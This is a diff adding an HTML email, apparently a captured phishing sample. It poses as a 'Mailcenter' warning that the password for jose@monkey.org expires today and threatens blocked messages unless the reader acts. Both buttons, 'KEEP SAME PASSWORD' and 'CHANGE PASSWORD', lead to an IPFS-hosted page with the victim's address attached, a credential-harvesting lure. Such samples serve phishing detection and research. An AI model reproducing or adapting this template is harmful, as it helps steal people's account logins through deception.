@@ -1,0 +1,148 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html class="sg-campaigns" xmlns="http://www.w3.org/1999/xhtml" data-editor-version="2"><head>
+      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+      <!--[if !mso]><!-->
+      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+      <!--<![endif]-->
+      <!--[if (gte mso 9)|(IE)]>
+      <xml>
+        <o:OfficeDocumentSettings>
+          <o:AllowPNG/>
+          <o:PixelsPerInch>96</o:PixelsPerInch>
+        </o:OfficeDocumentSettings>
+      </xml>
+      <![endif]-->
+      <!--[if (gte mso 9)|(IE)]>
+  <style type="text/css">
+    body {width: 600px;margin: 0 auto;}
+    table {border-collapse: collapse;}
+    table, td {mso-table-lspace: 0pt;mso-table-rspace: 0pt;}
+    img {-ms-interpolation-mode: bicubic;}
+  </style>
+<![endif]-->
+      <style type="text/css">
+    body, p, div {
+      font-family: arial,helvetica,sans-serif;
+      font-size: 14px;
+    }
+    body {
+      color: #000000;
+    }
+    body a {
+      color: #1188E6;
+      text-decoration: none;
+    }
+    p { margin: 0; padding: 0; }
+    table.wrapper {
+      width:100% !important;
+      table-layout: fixed;
+      -webkit-font-smoothing: antialiased;
+      -webkit-text-size-adjust: 100%;
+      -moz-text-size-adjust: 100%;
+      -ms-text-size-adjust: 100%;
+    }
+    img.max-width {
+      max-width: 100% !important;
+    }
+    .column.of-2 {
+      width: 50%;
+    }
+    .column.of-3 {
+      width: 33.333%;
+    }
+    .column.of-4 {
+      width: 25%;
+    }
+    ul ul ul ul  {
+      list-style-type: disc !important;
+    }
+    ol ol {
+      list-style-type: lower-roman !important;
+    }
+    ol ol ol {
+      list-style-type: lower-latin !important;
+    }
+    ol ol ol ol {
+      list-style-type: decimal !important;
+    }
+    @media screen and (max-width:480px) {
+      .preheader .rightColumnContent,
+      .footer .rightColumnContent {
+        text-align: left !important;
+      }
+      .preheader .rightColumnContent div,
+      .preheader .rightColumnContent span,
+      .footer .rightColumnContent div,
+      .footer .rightColumnContent span {
+        text-align: left !important;
+      }
+      .preheader .rightColumnContent,
+      .preheader .leftColumnContent {
+        font-size: 80% !important;
+        padding: 5px 0;
+      }
+      table.wrapper-mobile {
+        width: 100% !important;
+        table-layout: fixed;
+      }
+      img.max-width {
+        height: auto !important;
+        max-width: 100% !important;
+      }
+      a.bulletproof-button {
+        display: block !important;
+        width: auto !important;
+        font-size: 80%;
+        padding-left: 0 !important;
+        padding-right: 0 !important;
+      }
+      .columns {
+        width: 100% !important;
+      }
+      .column {
+        display: block !important;
+        width: 100% !important;
+        padding-left: 0 !important;
+        padding-right: 0 !important;
+        margin-left: 0 !important;
+        margin-right: 0 !important;
+      }
+      .social-icon-column {
+        display: inline-block !important;
+      }
+    }
+  </style>
+      <!--user entered Head Start--><!--End Head user entered-->
+    </head>
+    <body style="font-family: arial,helvetica,sans-serif;
+      font-size: 14px; color: #000000">
+<table style="color: rgb(34, 34, 34); text-transform: none; letter-spacing: normal; padding-top: 0px; padding-bottom: 0px; font-family: inherit; font-size: small; font-style: normal; word-spacing: 0px; white-space: normal; border-collapse: collapse; max-width: 548px; border-spacing: 0px; orphans: 2; widows: 2; font-stretch: inherit; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; 
+text-decoration-style: initial; text-decoration-color: initial;" border="0"><tbody><tr><td style='margin: 0px; width: 181px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; vertical-align: bottom;'>Mailcenter@ monkey.org </td><td style='margin: 0px; width: 186px; text-align: center; font-family: "Segoe UI", Frutiger, Arial, sans-serif; vertical-align: bottom;'>&nbsp;</td>
+<td style='margin: 0px; width: 181px; text-align: right; font-family: "Segoe UI", Frutiger, Arial, sans-serif; vertical-align: bottom;'>&nbsp;</td></tr><tr><td style='margin: 0px; width: 181px; padding-top: 0px; padding-bottom: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; vertical-align: middle;'><span style="margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: white; vertical-align: baseline;">
+<span style="margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: black; vertical-align: baseline; font-feature-settings: inherit; font-kerning: inherit;">Sender</span></span></td><td style='margin: 0px; width: 186px; text-align: center; padding-top: 0px; padding-bottom: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; vertical-align: middle;'>&nbsp;</td>
+<td style='margin: 0px; width: 181px; text-align: right; padding-top: 0px; padding-bottom: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; vertical-align: middle;'><span style="margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: white; vertical-align: baseline;"><span style="margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(192, 0, 0); vertical-align: baseline;">
+Action Required</span></span></td></tr><tr><td style="margin: 0px; padding: 0px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;" colspan="3"><table style="padding: 0px; border-collapse: collapse; border-spacing: 0px;" border="0" cellspacing="0" cellpadding="0"><tbody><tr><td style="margin: 0px; padding: 0px; width: 180px; height: 10px; line-height: 10px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px;" bgcolor="#cccccc">&nbsp;</td>
+<td style="margin: 0px; padding: 0px; width: 4px; height: 10px; line-height: 10px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px;" bgcolor="white">&nbsp;</td><td style="margin: 0px; padding: 0px; width: 180px; height: 10px; line-height: 10px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px;" bgcolor="#cccccc">&nbsp;</td>
+<td style="margin: 0px; padding: 0px; width: 4px; height: 10px; line-height: 10px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px;" bgcolor="white">&nbsp;</td><td style="margin: 0px; padding: 0px; width: 180px; height: 10px; line-height: 10px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px;" bgcolor="#c00000">&nbsp;</td></tr></tbody></table></td></tr><tr>
+<td style='margin: 0px; padding: 0px; width: 181px; line-height: 20px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px;'>&nbsp;</td><td style='margin: 0px; padding: 0px; width: 186px; text-align: center; line-height: 20px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px;'>&nbsp;</td>
+<td style='margin: 0px; padding: 0px; width: 181px; text-align: right; line-height: 20px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px;'><span style="margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: white; vertical-align: baseline;"><span style="margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(192, 0, 0); vertical-align: baseline;">Password&nbsp;About to Expire</span>
+</span>
+</td></tr></tbody></table>
+<div style="font-family: arial,helvetica,sans-serif;
+      font-size: 14px; color: rgb(34, 34, 34); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-size: small; font-style: normal; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><p style="font-family: arial,helvetica,sans-serif;
+      font-size: 14px; margin: 0; padding: 0">
+&nbsp;</p><table style="padding: 0px; width: 528px; margin-left: 0px; background-color: rgb(242, 245, 250);" border="0"><tbody><tr><td style='margin: 0px; padding: 0px 10px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 21px;'>&nbsp;<div style="font-family: arial,helvetica,sans-serif;
+      font-size: 14px; margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(32, 31, 30); font-family: inherit; font-size: 15px; vertical-align: baseline; font-stretch: inherit;">Dear jose,</div>
+<div style="font-family: arial,helvetica,sans-serif;
+      font-size: 14px; margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(32, 31, 30); font-family: inherit; font-size: 15px; vertical-align: baseline; font-stretch: inherit;">&nbsp;</div></td></tr><tr><td style='margin: 0px; padding: 0px 10px 6px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 16px;'>
+The&nbsp;password for jose@monkey.org<span style="margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(255, 0, 0); vertical-align: baseline;"><span style="margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(0, 0, 0); vertical-align: baseline;">&nbsp;expires Today.</span></span><br><br>Kindly use the below button to continue using the same password.<br>
+<table width="196" style="width: 196px; height: 31px;" border="3" cellspacing="0"><tbody><tr><td><strong><a href="https://ipfs.io/ipfs/QmQ7j9oJnZCsU26wy6TjyG9UCwGri2JxaogSqsJ38sEiKE?%20%20filename=camellionianlsation1qq.html#jose@monkey.org">KEEP SAME PASSWORD</a></strong></td></tr></tbody></table><table width="196" style="width: 196px; height: 31px;" border="3" cellspacing="0"><tbody><tr><td><strong>
+<a href="https://ipfs.io/ipfs/QmQ7j9oJnZCsU26wy6TjyG9UCwGri2JxaogSqsJ38sEiKE?%20%20filename=camellionianlsation1qq.html#jose@monkey.org">CHANGE PASSWORD</a></strong></td></tr></tbody></table><br>
+<br>
+&nbsp;<span style="color: rgb(12, 54, 84);"><em>
+</em><p style="font-family: arial,helvetica,sans-serif;
+      font-size: 14px; margin: 0; padding: 0; margin: 0px; padding: 0px; line-height: 1.5;" align="center"><font face="Calibri">Further messages might be prevented if any of the above actions are not performed.<br>This email was sent from&nbsp;monkey.org&nbsp;Mail Center.<br>&nbsp;<br>&nbsp;Copyright &copy; 2023 monkey.org&nbsp; Inc. All rights reserved.</font></p></span></td></tr><tr><td></td></tr><tr><td></td></tr><tr><td></td></tr><tr>
+<td style='margin: 0px; padding: 0px 10px 6px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 16px;'>&nbsp;</td></tr></tbody></table></div><p style="font-family: arial,helvetica,sans-serif;
+      font-size: 14px; margin: 0; padding: 0"><br class="Apple-interchange-newline"></p></body></html>
